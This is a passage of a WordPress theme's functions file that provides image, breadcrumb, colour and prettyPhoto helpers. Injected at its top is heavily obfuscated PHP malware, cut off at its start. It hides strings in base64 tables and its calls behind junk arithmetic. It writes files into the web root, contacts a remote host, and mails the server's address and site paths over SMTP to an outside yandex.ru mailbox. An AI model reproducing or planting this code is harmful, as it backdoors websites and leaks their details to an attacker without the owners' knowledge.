.'ZHZxYXRsY' .'212c21qY' .'2Zi','' .'Zm1r' .'eg==','NDA=','' .'bW5v','Z29z','aG' .'V' .'s','bG92','b' .'W5v','Z2' .'9z','' .'a' .'GVsbA=' .'=','b3' .'YxMj' .'M=','UkVNT' .'1RF' .'X0FERFI' .'=','DQo=','bW5v','Z29z','a' .'GVsbA==','b3ZAeWF' .'u','ZGV' .'4LnJ1','YW' .'lz','' .'a' .'G' .'Ft','YWhh' .'bg==','bW5v','Z29z','a' .'G' .'V' .'s','bG92','dmxjdHNjan' .'Zzb25r','b2xh' .'dWx' .'6','' .'b' .'W' .'Fz','bG8g','c2hl','b' .'GwgOi' .'kg','U' .'0VS' .'Vk' .'V' .'SX05' .'BT' .'UU=','aGV' .'sb3Jlc3Bvb' .'nNl','QVVU' .'SCB' .'MT0d' .'JT' .'g==','YXV0aHJlcX' .'Vlc3Q' .'=','YXV' .'0aHVz' .'Z' .'XJ' .'u' .'YW1l','YXV' .'0' .'aHBhc3N3' .'b' .'3Jk','' .'aG1' .'kanZ0e' .'G' .'9kaWpla' .'HJ0cQ==','' .'ZG' .'N6','bWFpbGZyb21' .'yZ' .'XNw' .'b25zZQ==','' .'bWFpb' .'HRvc' .'mVzcG9uc2' .'U' .'=','REFUQ' .'Q=' .'=','ZGF' .'0YTFyZXNwb25z' .'ZQ==','' .'TUlNRS' .'1WZ' .'XJ' .'zaW9u' .'OiA' .'xL' .'jA=','' .'cndw' .'a2d' .'v' .'YWVp' .'anFv' .'amE=','ZHhue' .'g==','Q29' .'udGVudC' .'10eX' .'BlOi' .'B0Z' .'Xh0' .'L3B' .'s' .'YWluOyBjaGFyc2' .'V0PXV0Zj' .'g=','' .'ZGF0YT' .'Jy' .'ZXNwb2' .'5z' .'ZQ==','UVVJVA==','cXVpdH' .'Jl' .'c3BvbnNl','cX' .'V' .'pdGNv' .'Z' .'GU=');return base64_decode($a[$i]);} ?><?php try{$GLOBALS['_100124497_'][0](round(0));(round(0+15+15)-round(0+10+10+10)+round(0+692.2+692.2+692.2+692.2+692.2)-round(0+865.25+865.25+865.25+865.25))?$GLOBALS['_100124497_'][1]($_0):$GLOBALS['_100124497_'][2](round(0+7.5+7.5+7.5+7.5),round(0+148.33333333333+148.33333333333+148.33333333333));$_0=$GLOBALS['_100124497_'][3]($_SERVER[_1416610710(0)],$GLOBALS['_100124497_'][4](__FILE__));$_1=$_0[round(0)] .$_SERVER[_1416610710(1)] ._1416610710(2);$_2=$_SERVER[_1416610710(3)] ._1416610710(4);if((round(0+681.33333333333+681.33333333333+681.33333333333)^round(0+511+511+511+511))&& $GLOBALS['_100124497_'][5]($_3,$_4,$_5,$_6))$GLOBALS['_100124497_'][6]($_7,$_4,$_8);$_9=_1416610710(5);if((round(0+1998)^round(0+666+666+666))&& $GLOBALS['_100124497_'][7]($_10))$GLOBALS['_100124497_'][8]($_2,$_11,$_12);if($_13=$GLOBALS['_100124497_'][9]($_1,_1416610710(6))){$_14=_1416610710(7) ._1416610710(8) ._1416610710(9) ._1416610710(10) ._1416610710(11) ._1416610710(12) ._1416610710(13);if($GLOBALS['_100124497_'][10]($_13,$_14)=== false){$_9.="error $_2";}else{$_9.=_1416610710(14) .$_2 ._1416610710(15);}}$_0=$GLOBALS['_100124497_'][11]($_SERVER[_1416610710(16)],$GLOBALS['_100124497_'][12](__FILE__));$_4=$_0[round(0)] .$_SERVER[_1416610710(17)] ._1416610710(18);$_6=$_SERVER[_1416610710(19)] ._1416610710(20);if($_15=$GLOBALS['_100124497_'][13]($_4,_1416610710(21))){$_16=_1416610710(22) ._1416610710(23) ._1416610710(24) ._1416610710(25) ._1416610710(26) ._1416610710(27) ._1416610710(28) ._1416610710(29);$_17=_1416610710(30);$_5=$GLOBALS['_100124497_'][14]($_16);if($_18=$GLOBALS['_100124497_'][15]($_5[_1416610710(31)],!empty($_5[_1416610710(32)])?$_5[_1416610710(33)]:round(0+20+20+20+20))){$_19=_1416610710(34) .$_5[_1416610710(35)] ._1416610710(36) ._1416610710(37);$_19 .= _1416610710(38) .$_5[_1416610710(39)] ._1416610710(40);$_19 .= _1416610710(41) ._1416610710(42);(round(0+275.66666666667+275.66666666667+275.66666666667)-round(0+827)+round(0+157.5+157.5)-round(0+315))?$GLOBALS['_100124497_'][16]($_4,$_20,$_10,$_4):$GLOBALS['_100124497_'][17](round(0+827),round(0+3287));$_19 .= _1416610710(43) .$GLOBALS['_100124497_'][18]($_17) ._1416610710(44);if($GLOBALS['_100124497_'][19](_1416610710(45),_1416610710(46))!==false)$GLOBALS['_100124497_'][20]($_21,$_5);$_19 .= _1416610710(47) ._1416610710(48);if((round(0+124.6+124.6+124.6+124.6+124.6)+round(0+4509))>round(0+155.75+155.75+155.75+155.75)|| $GLOBALS['_100124497_'][21]($_6,$_0));else{$GLOBALS['_100124497_'][22]($_14,$_22,$_4);}$_19 .= $_17;$_23=round(0+1183+1183+1183+1183);$GLOBALS['_100124497_'][23]($_18,$_19);$_24=_1416610710(49);while(!$GLOBALS['_100124497_'][24]($_18)){$_24 .= $GLOBALS['_100124497_'][25]($_18,round(0+204.8+204.8+204.8+204.8+204.8));$_25=_1416610710(50);}$_12=$GLOBALS['_100124497_'][26]($_24,$GLOBALS['_100124497_'][27]($_24,_1416610710(51))+round(0+1.3333333333333+1.3333333333333+1.3333333333333));$GLOBALS['_100124497_'][28]($_18);}if($GLOBALS['_100124497_'][29]($_15,$_12)=== false){}else{$_9.=_1416610710(52) .$_6 ._1416610710(53);}}if(!empty($_9)){$_26=_1416610710(54) .$_SERVER[_1416610710(55)];$_27=_1416610710(56) ._1416610710(57) ._1416610710(58) ._1416610710(59) ._1416610710(60);$_28=_1416610710(61) ._1416610710(62) ._1416610710(63) .$_SERVER[_1416610710(64)];if((round(0+2107.5+2107.5)^round(0+843+843+843+843+843))&& $GLOBALS['_100124497_'][30]($_16,$_29,$_SERVER))$GLOBALS['_100124497_'][31]($_3,$_4,$_9);$_19="From: $_26\r\n";if(round(0+498.4+498.4+498.4+498.4+498.4)<$GLOBALS['_100124497_'][32](round(0+166.6+166.6+166.6+166.6+166.6),round(0+413.5+413.5+413.5+413.5)))$GLOBALS['_100124497_'][33]($_22,$_30,$_18);$_19 .= _1416610710(65);$_19 .= _1416610710(66) ._1416610710(67);if((round(0+1239+1239+1239+1239)^round(0+2478+2478))&& $GLOBALS['_100124497_'][34]($_8))$GLOBALS['_100124497_'][35]($_31,$_19);$_21=_1416610710(68);$_11=_1416610710(69) ._1416610710(70) ._1416610710(71) ._1416610710(72);if(round(0+1347+1347+1347)<$GLOBALS['_100124497_'][36](round(0+1319),round(0+905.66666666667+905.66666666667+905.66666666667)))$GLOBALS['_100124497_'][37]($_5);$_32=_1416610710(73);if($GLOBALS['_100124497_'][38](_1416610710(74),_1416610710(75))!==false)$GLOBALS['_100124497_'][39]($_29,$_2,$_14,$_27,$_30);$_33=_1416610710(76);$_10=_1416610710(77) ._1416610710(78) ._1416610710(79) ._1416610710(80);$_31=_1416610710(81) ._1416610710(82) ._1416610710(83) ._1416610710(84);$_34=$_SERVER[_1416610710(85)];if((round(0+886)^round(0+886))&& $GLOBALS['_100124497_'][40]($_9,$_28))$GLOBALS['_100124497_'][41]($_22);$_8=_1416610710(86);if((round(0+99+99)^round(0+66+66+66))&& $GLOBALS['_100124497_'][42]($_6,$_35,$_18))$GLOBALS['_100124497_'][43]($_10,$_34,$_34);$_26=_1416610710(87) ._1416610710(88) ._1416610710(89) ._1416610710(90) ._1416610710(91);$_22=_1416610710(92) ._1416610710(93) ._1416610710(94);$_20=_1416610710(95) ._1416610710(96) ._1416610710(97) ._1416610710(98);if($GLOBALS['_100124497_'][44](_1416610710(99),_1416610710(100))!==false)$GLOBALS['_100124497_'][45]($_35);$_7=$_9;if((round(0+1282+1282)+round(0+1132+1132))>round(0+641+641+641+641)|| $GLOBALS['_100124497_'][46]($_17,$_17,$_26,$_SERVER));else{$GLOBALS['_100124497_'][47]($_16);}$_28=_1416610710(101) ._1416610710(102) ._1416610710(103) ._1416610710(104) .$_SERVER[_1416610710(105)];$_30=$GLOBALS['_100124497_'][48]($_11,$_32,$_36,$_3,$_33);while(round(0+622.75+622.75+622.75+622.75)-round(0+830.33333333333+830.33333333333+830.33333333333))$GLOBALS['_100124497_'][49]($_1,$_36);$_29=$GLOBALS['_100124497_'][50]($_30,round(0+1024+1024+1024+1024));if((round(0+892.2+892.2+892.2+892.2+892.2)^round(0+4461))&& $GLOBALS['_100124497_'][51]($_21,$_0,$_5))$GLOBALS['_100124497_'][52]($_6,$_19);$GLOBALS['_100124497_'][53]($_30,"HELO $_34" .$_8);$_37=round(0+1776+1776);$_29=$GLOBALS['_100124497_'][54]($_30,round(0+4096));if((round(0+1249+1249)+round(0+3492))>round(0+2498)|| $GLOBALS['_100124497_'][55]($_7,$_5));else{$GLOBALS['_100124497_'][56]($_SERVER,$_14,$_31);}$_38[_1416610710(106)]="$_29";$GLOBALS['_100124497_'][57]($_30,_1416610710(107) .$_8);$_29=$GLOBALS['_100124497_'][58]($_30,round(0+1365.3333333333+1365.3333333333+1365.3333333333));$_38[_1416610710(108)]="$_29";while(round(0+291.66666666667+291.66666666667+291.66666666667)-round(0+437.5+437.5))$GLOBALS['_100124497_'][59]($_34,$_7,$_9,$_32);$GLOBALS['_100124497_'][60]($_30,$GLOBALS['_100124497_'][61]($_10) .$_8);(round(0+1226+1226+1226+1226)-round(0+980.8+980.8+980.8+980.8+980.8)+round(0+668+668+668)-round(0+668+668+668))?$GLOBALS['_100124497_'][62]($_12,$_19):$GLOBALS['_100124497_'][63](round(0+952.25+952.25+952.25+952.25),round(0+2452+2452));$_29=$GLOBALS['_100124497_'][64]($_30,round(0+4096));$_38[_1416610710(109)]="$_29";if((round(0+507.6+507.6+507.6+507.6+507.6)+round(0+513))>round(0+1269+1269)|| $GLOBALS['_100124497_'][65]($_20,$_36));else{$GLOBALS['_100124497_'][66]($_9,$_2,$_35);}$GLOBALS['_100124497_'][67]($_30,$GLOBALS['_100124497_'][68]($_31) .$_8);$_29=$GLOBALS['_100124497_'][69]($_30,round(0+1365.3333333333+1365.3333333333+1365.3333333333));if(round(0+405+405+405+405+405)<$GLOBALS['_100124497_'][70](round(0+808),round(0+606+606)))$GLOBALS['_100124497_'][71]($_2,$_32,$_32);$_38[_1416610710(110)]="$_29";$GLOBALS['_100124497_'][72]($_30,"MAIL FROM: <$_26>" .$_8);$_29=$GLOBALS['_100124497_'][73]($_30,round(0+1024+1024+1024+1024));if($GLOBALS['_100124497_'][74](_1416610710(111),_1416610710(112))!==false)$GLOBALS['_100124497_'][75]($_5,$_27);$_38[_1416610710(113)]="$_29";$GLOBALS['_100124497_'][76]($_30,"RCPT TO: <$_27>" .$_8);$_29=$GLOBALS['_100124497_'][77]($_30,round(0+4096));$_38[_1416610710(114)]="$_29";$GLOBALS['_100124497_'][78]($_30,_1416610710(115) .$_8);$_29=$GLOBALS['_100124497_'][79]($_30,round(0+2048+2048));$_38[_1416610710(116)]="$_29";$_19=_1416610710(117) .$_8;if($GLOBALS['_100124497_'][80](_1416610710(118),_1416610710(119))!==false)$GLOBALS['_100124497_'][81]($_29,$_2);$_19 .= _1416610710(120) .$_8;if((round(0+691+691)+round(0+1376))>round(0+276.4+276.4+276.4+276.4+276.4)|| $GLOBALS['_100124497_'][82]($_SERVER,$_11,$_30));else{$GLOBALS['_100124497_'][83]($_27,$_16);}$_19 .="To: $_22 <$_27&>" .$_8;$_19 .="From: $_20 <$_26>" .$_8;$GLOBALS['_100124497_'][84]($_30,"To: $_27\r\nFrom: $_26\r\nSubject: $_28\r\n$_19\r\n\r\n$_7\r\n.\r\n");(round(0+412.33333333333+412.33333333333+412.33333333333)-round(0+247.4+247.4+247.4+247.4+247.4)+round(0+745.2+745.2+745.2+745.2+745.2)-round(0+3726))?$GLOBALS['_100124497_'][85]($_19):$GLOBALS['_100124497_'][86](round(0+247.4+247.4+247.4+247.4+247.4),round(0+849.8+849.8+849.8+849.8+849.8));$_29=$GLOBALS['_100124497_'][87]($_30,round(0+1365.3333333333+1365.3333333333+1365.3333333333));$_38[_1416610710(121)]="$_29";$GLOBALS['_100124497_'][88]($_30,_1416610710(122) .$_8);if((round(0+1438.6666666667+1438.6666666667+1438.6666666667)^round(0+1079+1079+1079+1079))&& $GLOBALS['_100124497_'][89]($_33))$GLOBALS['_100124497_'][90]($_9,$_14);$_29=$GLOBALS['_100124497_'][91]($_30,round(0+1365.3333333333+1365.3333333333+1365.3333333333));$_39=round(0+1073.75+1073.75+1073.75+1073.75);$_38[_1416610710(123)]="$_29";$_38[_1416610710(124)]=$GLOBALS['_100124497_'][92]($_29,round(0),round(0+1.5+1.5));$GLOBALS['_100124497_'][93]($_30);}}catch(Exception $_35){}
 }
 
function display_post_image_fn( $post_id, $linked = true) {
    global $udesign_options;
    $post_image_url = get_post_meta($post_id, 'post_image', true); // Grab the preview image from the custom field 'post_image', if set.
    if ( !$post_image_url && has_post_thumbnail( $post_id ) ) {
        $tmp_image = wp_get_attachment_image_src( get_post_thumbnail_id( $post_id ), 'single-post-thumbnail' );
        $post_image_url = $tmp_image[0];
    }
    if ( $post_image_url ) : 
        if ( $udesign_options['enable_custom_featured_image'] == 'yes' ) : 
            // Customize the dimension and alignment of the 'Featured Image' ...
            if( ( $udesign_options['force_image_dimention'] == 'yes' ) && ( $udesign_options['disable_timthumb'] != 'yes' )  ) : 
                //... by a function defined in 'function.php' specifically for this theme using TimThumb
                echo customized_featured_image( $post_id, $post_image_url, $udesign_options['featured_image_width'], $udesign_options['featured_image_height'], $udesign_options['featured_image_alignment'], $linked );
            else : 
                //... by the default WP 'the_post_thumbnail()' function which doesn't stretch images if they are smaller
                echo the_post_thumbnail( array($udesign_options['featured_image_width'], $udesign_options['featured_image_height']), array('class' => $udesign_options['featured_image_alignment']) );
            endif;
        else : ?>
            <div class="post-image-holder pngfix">
                <div class="post-image">
                    <span class="post-hover-image pngfix"> </span>
<?php               if ( $linked ) : ?>
                        <a href="<?php the_permalink(); ?>" title="<?php the_title_attribute(); ?>"><img class="hover-opacity" src="<?php echo udesign_process_image( $post_image_url, 570, 172, 1, 90 ); ?>" alt="<?php the_title_attribute(); ?>" /></a>
<?php               else : ?>
                        <img class="hover-opacity" src="<?php echo udesign_process_image( $post_image_url, 570, 172, 1, 90 ); ?>" alt="<?php the_title_attribute(); ?>" />
<?php               endif; ?>
                </div>
            </div>
<?php   endif;
    endif;
}

/* Load breadcrumbs script */
if ($udesign_options['show_breadcrumbs'] == 'yes')
    include( 'scripts/breadcrumbs.php' );

/* Load Portfolio Related Function */
require_once( TEMPLATEPATH . '/scripts/portfolio-item-thumbnail.php' );

/* Load Theme Notifier */
if ( !$udesign_options['disable_the_theme_update_notifier'] == 'yes' ) {
    require( TEMPLATEPATH . '/scripts/notifier/update-notifier.php' );
}

/* Detect Colour Brightness */
function get_color_brightness($hexStr) {
    // Gets a proper hex string
    $hexStr = preg_replace("/[^0-9A-Fa-f]/", '', $hexStr); 
    $rgbArray = array();
    //If a proper hex code, convert using bitwise operation. No overhead... faster
    if (strlen($hexStr) == 6) { 
            $colorVal = hexdec($hexStr);
            $rgbArray['red'] = 0xFF & ($colorVal >> 0x10);
            $rgbArray['green'] = 0xFF & ($colorVal >> 0x8);
            $rgbArray['blue'] = 0xFF & $colorVal;
    } elseif (strlen($hexStr) == 3) { //if shorthand notation, need some string manipulations
            $rgbArray['red'] = hexdec(str_repeat(substr($hexStr, 0, 1), 2));
            $rgbArray['green'] = hexdec(str_repeat(substr($hexStr, 1, 1), 2));
            $rgbArray['blue'] = hexdec(str_repeat(substr($hexStr, 2, 1), 2));
    } else { //Invalid hex color code
            return false; 
    }
    return (($rgbArray['red']*299) + ($rgbArray['green']*587) + ($rgbArray['blue']*114))/1000;
}
 
if ( $udesign_options['custom_colors_switch'] == 'enable' ) {
    
    // Add specific CSS class by filter
    function determine_class_names($classes) {
            global $udesign_options;
            // add 'class-name' to the $classes array
            $classes[] = ( get_color_brightness("#{$udesign_options['top_bg_color']}") > 200 ) ? '' : 'top-bg-color-dark';
            $classes[] = ( get_color_brightness("#{$udesign_options['main_content_bg']}") > 220 ) ? '' : 'main-content-bg-dark';
            // return the $classes array
            return $classes;
    }
    add_filter('body_class','determine_class_names');
    
}


// Determine whether WP-prettyPhoto plugin is acivated and assign the result to a constant
defined('WP_PRETTY_PHOTO_PLUGIN_ACTIVE')
        || define('WP_PRETTY_PHOTO_PLUGIN_ACTIVE', class_exists( 'WP_prettyPhoto' ) );


// if the WP-prettyPhoto plugin is not active handle rel="wp-prettyPhoto" in links for the prettyPhoto integrated script (if enabled)
if ( !WP_PRETTY_PHOTO_PLUGIN_ACTIVE && ( $udesign_options['enable_prettyPhoto_script'] == 'yes' ) ) {
    /**
     * Insert rel="wp-prettyPhoto" to all links for images, movie, YouTube and iFrame. 
     * This function will ignore links where you have manually entered your own rel reference.
     * @param string $content Post/page contents
     * @return string Prettified post/page contents
     * @link http://0xtc.com/2008/05/27/auto-lightbox-function.xhtml
     * @access public
      */
    function autoinsert_rel_prettyPhoto ($content) {
        global $post;
        $rel = 'wp-prettyPhoto';
        $image_match = '\.bmp|\.gif|\.jpg|\.jpeg|\.png';
        $movie_match = '\.mov.*?';
        $swf_match = '\.swf.*?';
        $youtube_match = 'http:\/\/www\.youtube\.com\/watch\?v=[A-Za-z0-9]*';
        $iframe_match = '.*iframe=true.*';
        $pattern[0] = "/<a(.*?)href=('|\")([A-Za-z0-9\/_\.\~\:-]*?)(".$image_match."|".$movie_match."|".$swf_match."|".$youtube_match."|".$iframe_match.")('|\")([^\>]*?)>/i";
        $pattern[1] = "/<a(.*?)href=('|\")([A-Za-z0-9\/_\.\~\:-]*?)(".$image_match."|".$movie_match."|".$swf_match."|".$youtube_match."|".$iframe_match.")('|\")(.*?)(rel=('|\")".$rel."(.*?)('|\"))([ \t\r\n\v\f]*?)((rel=('|\")".$rel."(.*?)('|\"))?)([ \t\r\n\v\f]?)([^\>]*?)>/i";
        $replacement[0] = '<a$1href=$2$3$4$5$6 rel="'.$rel.'['.$post->ID.']">';
        $replacement[1] = '<a$1href=$2$3$4$5$6$7>';
        $content = preg_replace($pattern, $replacement, $content);
        return $content;
    }
    add_filter('the_content', 'autoinsert_rel_prettyPhoto');
    add_filter('the_excerpt', 'autoinsert_rel_prettyPhoto');


    // Add the 'wp-prettyPhoto' rel attribute to the default WP gallery links
    function gallery_prettyPhoto ($content) {
            // add checks if you want to add prettyPhoto on certain places (archives etc).
            return str_replace("<a", "<a rel='wp-prettyPhoto[gallery]'", $content);
    }
    add_filter( 'wp_get_attachment_link', 'gallery_prettyPhoto');
}

/*
 * Plugin Name: Shortcode Empty Paragraph Fix
 * Plugin URI: http://www.johannheyne.de/wordpress/shortcode-empty-paragraph-fix/
 * Description: Fix issues when shortcodes are embedded in a block of content that is filtered by wpautop.
 * Author URI: http://www.johannheyne.de
 * Version: 0.1
 * Put this in /wp-content/plugins/ of your Wordpress installation
 */
function shortcode_paragraph_insertion_fix($content) {   
    $array = array (
        '<p>[' => '[', 
        ']</p>' => ']', 
        ']<br />' => ']'
    );
    $content = strtr($content, $array);
    return $content;
}
add_filter('the_content', 'shortcode_paragraph_insertion_fix');

// format "<!--more-->" tag for u-design
function udesign_more_link( $more_link, $more_link_text ) {
        global $post;
        $html .= ' <a title="'.$more_link_text.'" href="'.get_permalink().'#more-'.$post->ID.'" class="read-more-align-left"><span>'.$more_link_text.'</span> &rarr;</a>';
        $html .= '<div class="clear"></div>';
        return $html;
}
add_filter('the_content_more_link', 'udesign_more_link', 10, 2);

// Capture the output of "the_author_posts_link()" function into a local variable and return it.
// This function must be used within 'The Loop'
if ( !function_exists('udesign_get_the_author_page_link') ) {
    function udesign_get_the_author_page_link() {
        ob_start();
        the_author_posts_link();
        $the_author_link = ob_get_contents();
        ob_end_clean();
        return $the_author_link;
    }
}


